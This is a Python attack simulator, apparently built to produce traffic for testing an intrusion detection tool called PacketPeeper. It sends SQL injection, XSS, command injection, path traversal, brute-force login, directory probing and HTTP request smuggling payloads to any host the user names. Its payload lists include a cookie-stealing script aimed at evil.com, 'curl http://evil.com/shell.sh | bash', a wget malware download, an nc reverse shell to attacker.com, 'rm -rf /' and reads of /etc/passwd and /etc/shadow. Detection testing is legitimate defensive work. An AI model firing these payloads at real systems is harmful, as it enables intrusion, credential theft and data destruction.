#!/usr/bin/env python3
"""
Application Layer Attack Simulation - Tests detection of web/application attacks
For EDUCATIONAL and AUTHORIZED TESTING purposes only!
"""

import argparse
import time
import random
import socket
import string
import threading
from urllib.parse import quote
import requests
from typing import List

# Disable SSL warnings for testing
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


class ApplicationAttacks:
    """Simulates various application layer attack patterns for detection testing"""
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}" if port != 443 else f"https://{target}"
        self.session = requests.Session()
        # Set very short timeout to prevent hanging
        self.session.timeout = 1
        
    def _send_http_raw(self, path: str, method: str = "GET", data: str = "") -> bool:
        """Send raw HTTP request via socket (faster, no waiting for response)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((self.target, self.port))
            
            if method == "GET":
                request = f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\nConnection: close\r\n\r\n"
            else:
                request = f"POST {path} HTTP/1.1\r\nHost: {self.target}\r\nContent-Length: {len(data)}\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n{data}"
            
            sock.send(request.encode())
            sock.close()
            return True
        except:
            return True  # Count as sent even if connection failed
        
    def sql_injection(self, count: int = 50) -> None:
        """
        SQL Injection Patterns - Sends requests with SQL injection payloads
        Detection: SQL keywords in parameters, unusual query patterns
        Severity: CRITICAL
        """
        print(f"\n[*] Starting SQL Injection Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: SQL_INJECTION / SQLI_ATTEMPT")
        
        # Common SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "1' AND '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "-1' UNION SELECT 1,2,3--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(10000000,SHA1('test'))--",
            "admin' AND '1'='1",
            "' OR EXISTS(SELECT * FROM users)--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "1' HAVING 1=1--",
            "1' GROUP BY columnname HAVING 1=1--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; INSERT INTO users VALUES('hacker','hacked')--",
            "1; UPDATE users SET password='hacked'--",
            "' OR ASCII(SUBSTRING(password,1,1))>65--",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(sqli_payloads)
            
            # Test various injection points
            endpoints = [
                f"/login?username={quote(payload)}&password=test",
                f"/search?q={quote(payload)}",
                f"/user?id={quote(payload)}",
                f"/product?id={quote(payload)}",
                f"/page?id={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                # Use raw socket for faster execution
                self._send_http_raw(endpoint)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [SQLi] Sent {request_count} injection attempts...")
                    
                time.sleep(0.05)
            except:
                request_count += 1  # Count even if request fails
                
        print(f"[+] SQL Injection complete - Sent {request_count} requests")
    
    def xss_attack(self, count: int = 50) -> None:
        """
        XSS (Cross-Site Scripting) Patterns - Sends requests with XSS payloads
        Detection: Script tags, event handlers in parameters
        Severity: HIGH
        """
        print(f"\n[*] Starting XSS Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: XSS_ATTACK / CROSS_SITE_SCRIPTING")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "<svg/onload=alert('XSS')>",
            "<a href='javascript:alert(1)'>click</a>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('XSS')}",
            "<%=alert('XSS')%>",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(xss_payloads)
            
            endpoints = [
                f"/search?q={quote(payload)}",
                f"/comment?text={quote(payload)}",
                f"/profile?name={quote(payload)}",
                f"/message?content={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                self._send_http_raw(endpoint)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [XSS] Sent {request_count} XSS attempts...")
                    
                time.sleep(0.05)
            except:
                request_count += 1
                
        print(f"[+] XSS Attack complete - Sent {request_count} requests")
    
    def command_injection(self, count: int = 30) -> None:
        """
        OS Command Injection - Sends requests with command injection payloads
        Detection: Shell metacharacters, command patterns
        Severity: CRITICAL
        """
        print(f"\n[*] Starting Command Injection Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: COMMAND_INJECTION / RCE_ATTEMPT")
        
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la",
            "| ls -la",
            "; id",
            "& net user",
            "| net user",
            "; ping -c 3 127.0.0.1",
            "| ping 127.0.0.1",
            "; curl http://evil.com/shell.sh | bash",
            "$(curl http://evil.com/shell.sh)",
            "; wget http://evil.com/malware -O /tmp/mal",
            "& powershell -enc base64payload",
            "| nc -e /bin/sh attacker.com 4444",
            "; rm -rf /",
            "&& shutdown -h now",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(cmd_payloads)
            
            endpoints = [
                f"/ping?host=127.0.0.1{quote(payload)}",
                f"/lookup?domain=example.com{quote(payload)}",
                f"/convert?file=test.pdf{quote(payload)}",
                f"/exec?cmd={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                self._send_http_raw(endpoint)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [CMD] Sent {request_count} command injection attempts...")
                    
                time.sleep(0.05)
            except:
                request_count += 1
                
        print(f"[+] Command Injection complete - Sent {request_count} requests")
    
    def path_traversal(self, count: int = 30) -> None:
        """
        Path Traversal/LFI - Attempts to access files outside web root
        Detection: ../ patterns, sensitive file paths
        Severity: HIGH
        """
        print(f"\n[*] Starting Path Traversal Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: PATH_TRAVERSAL / LFI_ATTEMPT")
        
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00",
            "....//....//....//etc/shadow",
            "../../../var/log/apache2/access.log",
            "../../../proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/var/www/html/../../../etc/passwd",
            "....\\....\\....\\windows\\win.ini",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(lfi_payloads)
            
            endpoints = [
                f"/file?path={quote(payload)}",
                f"/download?file={quote(payload)}",
                f"/include?page={quote(payload)}",
                f"/view?template={quote(payload)}",
                f"/load?module={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                self._send_http_raw(endpoint)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [LFI] Sent {request_count} path traversal attempts...")
                    
                time.sleep(0.05)
            except:
                request_count += 1
                
        print(f"[+] Path Traversal complete - Sent {request_count} requests")
    
    def brute_force(self, count: int = 100) -> None:
        """
        Brute Force Attack - Rapid login attempts
        Detection: Multiple failed logins from same source
        Severity: HIGH
        """
        print(f"\n[*] Starting Brute Force Attack on {self.base_url}")
        print(f"[*] Count: {count} attempts")
        print("[*] Expected Detection: BRUTE_FORCE / LOGIN_ATTACK")
        print("[*] Note: Using raw sockets to ensure traffic is generated even without a web server")
        
        # Common usernames
        usernames = ["admin", "root", "user", "test", "administrator", "guest", "operator"]
        
        # Common passwords (for testing detection only)
        passwords = [
            "password", "123456", "admin", "root", "letmein", "welcome",
            "password123", "qwerty", "abc123", "monkey", "master", "dragon",
            "111111", "baseball", "iloveyou", "trustno1", "sunshine", "princess"
        ]
        
        attempt_count = 0
        
        # Use common brute-force target ports
        target_ports = [22, 23, 21, 3389, 80, 443, 3306, 5432]
        
        for _ in range(count):
            username = random.choice(usernames)
            password = random.choice(passwords)
            target_port = random.choice(target_ports)
            
            try:
                # Use raw socket connection to generate traffic
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)  # Short timeout
                
                try:
                    sock.connect((self.target, target_port))
                    # Send login-like data
                    login_data = f"USER {username}\r\nPASS {password}\r\n"
                    sock.send(login_data.encode())
                except (socket.timeout, ConnectionRefusedError, OSError):
                    pass  # Expected - we're just generating traffic
                finally:
                    sock.close()
                
                attempt_count += 1
                
                if attempt_count % 20 == 0:
                    print(f"    [BRUTE] Sent {attempt_count} login attempts...")
                    
                time.sleep(0.02)  # Fast attempts
            except Exception as e:
                attempt_count += 1
                
        print(f"[+] Brute Force complete - Sent {attempt_count} attempts")
    
    def directory_enumeration(self, count: int = 100) -> None:
        """
        Directory Enumeration - Attempts to find hidden directories
        Detection: High 404 rate, common sensitive paths
        Severity: MEDIUM
        """
        print(f"\n[*] Starting Directory Enumeration on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: DIRECTORY_ENUM / RECON_ACTIVITY")
        
        # Common directories to probe
        directories = [
            "admin", "administrator", "login", "wp-admin", "phpmyadmin",
            "backup", "backups", "bak", "old", "temp", "tmp", "test",
            "dev", "development", "staging", "api", "api/v1", "api/v2",
            ".git", ".svn", ".htaccess", ".env", "config", "configuration",
            "database", "db", "sql", "mysql", "postgres", "mongodb",
            "uploads", "files", "documents", "images", "assets",
            "private", "secret", "hidden", "internal", "intranet",
            "console", "dashboard", "portal", "manage", "manager",
            "cgi-bin", "scripts", "bin", "includes", "include",
            "wp-content", "wp-includes", "xmlrpc.php", "readme.html",
            "server-status", "server-info", "phpinfo.php", "info.php",
        ]
        
        request_count = 0
        
        for _ in range(count):
            directory = random.choice(directories)
            
            try:
                self._send_http_raw(f"/{directory}")
                request_count += 1
                
                if request_count % 20 == 0:
                    print(f"    [ENUM] Sent {request_count} directory probes...")
                    
                time.sleep(0.02)
            except:
                request_count += 1
                
        print(f"[+] Directory Enumeration complete - Sent {request_count} requests")
    
    def http_smuggling(self, count: int = 20) -> None:
        """
        HTTP Request Smuggling - Malformed HTTP requests
        Detection: Conflicting Content-Length/Transfer-Encoding
        Severity: HIGH
        """
        print(f"\n[*] Starting HTTP Smuggling Attack on {self.target}:{self.port}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: HTTP_SMUGGLING / MALFORMED_HTTP")
        
        request_count = 0
        
        # Various smuggling payloads
        smuggling_requests = [
            # CL.TE
            b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
            # TE.CL
            b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGETXSMUGGLED\r\n0\r\n\r\n",
            # TE.TE (obfuscated)
            b"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n",
            # Double Content-Length
            b"GET / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\nContent-Length: 99\r\n\r\n",
        ]
        
        for _ in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.port))
                
                payload = random.choice(smuggling_requests)
                payload = payload.replace(b"target", self.target.encode())
                
                sock.send(payload)
                sock.close()
                request_count += 1
                
                if request_count % 5 == 0:
                    print(f"    [SMUGGLE] Sent {request_count} smuggling attempts...")
                    
                time.sleep(0.2)
            except:
                request_count += 1
                
        print(f"[+] HTTP Smuggling complete - Sent {request_count} requests")


def main():
    parser = argparse.ArgumentParser(description="Application Layer Attack Simulator")
    parser.add_argument("--target", "-t", default=None, help="Target IP/hostname (e.g., your router IP like 192.168.1.1)")
    parser.add_argument("--port", "-p", type=int, default=80, help="Target port")
    parser.add_argument("--type", "-T", default="sqli",
                        choices=["sqli", "xss", "cmd", "lfi", "brute", "enum", "smuggle", "all"],
                        help="Attack type")
    parser.add_argument("--count", "-c", type=int, default=50, help="Number of requests")
    
    args = parser.parse_args()
    
    # Warn if no target specified
    if args.target is None:
        print("\n" + "=" * 60)
        print("  ⚠️  ERROR: You must specify a target!")
        print("=" * 60)
        print("  DO NOT use 127.0.0.1 - loopback traffic won't be captured!")
        print("  ")
        print("  Use your router IP or another device on your network:")
        print("    python application_attacks.py --target 192.168.1.1 --type all")
        print("  ")
        print("  To find your router IP, run: ipconfig | findstr Gateway")
        print("=" * 60)
        return
    
    if args.target == "127.0.0.1" or args.target == "localhost":
        print("\n" + "=" * 60)
        print("  ⚠️  WARNING: Using localhost/127.0.0.1!")
        print("=" * 60)
        print("  Loopback traffic doesn't go through your network interface,")
        print("  so PacketPeeper will NOT capture these packets!")
        print("  ")
        print("  Use your router IP instead: 192.168.1.1 (or check ipconfig)")
        print("=" * 60)
        proceed = input("\n  Continue anyway? (y/N): ")
        if proceed.lower() != 'y':
            return
    
    print("=" * 60)
    print("  APPLICATION ATTACK SIMULATOR - Detection Testing Tool")
    print("  ⚠️  WARNING: For authorized testing only!")
    print("=" * 60)
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Attack Type: {args.type}")
    print(f"  Request Count: {args.count}")
    print("=" * 60)
    
    app = ApplicationAttacks(args.target, args.port)
    
    try:
        if args.type == "sqli" or args.type == "all":
            app.sql_injection(args.count)
        if args.type == "xss" or args.type == "all":
            app.xss_attack(args.count)
        if args.type == "cmd" or args.type == "all":
            app.command_injection(args.count // 2)
        if args.type == "lfi" or args.type == "all":
            app.path_traversal(args.count // 2)
        if args.type == "brute" or args.type == "all":
            app.brute_force(args.count * 2)
        if args.type == "enum" or args.type == "all":
            app.directory_enumeration(args.count * 2)
        if args.type == "smuggle" or args.type == "all":
            app.http_smuggling(20)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    print("\n[*] Attack simulation complete. Check PacketPeeper for detections!")


if __name__ == "__main__":
    main()
